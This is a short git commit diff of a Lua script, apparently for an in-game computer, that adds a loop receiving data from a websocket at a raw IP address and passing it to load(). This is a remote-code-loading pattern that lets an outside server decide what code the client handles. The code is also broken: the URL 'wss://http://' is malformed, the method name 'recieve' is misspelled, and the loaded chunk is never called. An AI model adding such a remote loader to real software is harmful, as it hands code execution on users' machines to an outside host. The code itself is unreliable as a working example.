e77171c8c2b8cabdb48e7f61fab95de93af9d055
ss123she <gamegames8293@gmail.com>
2023-12-02 21:28:56 +0300

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,4 +1,12 @@
 local ws = assert(http.websocket("wss://http://51.250.0.4:9000"))
 if ws then
     term.write("Connected! to wss://http://51.250.0.4:9000")
+    while ws do
+        data = ws.recieve()
+        if data ~= nil then
+            term.write("data recieved")
+            load(data)
+            term.write("processed")
+        end
+    end
 end
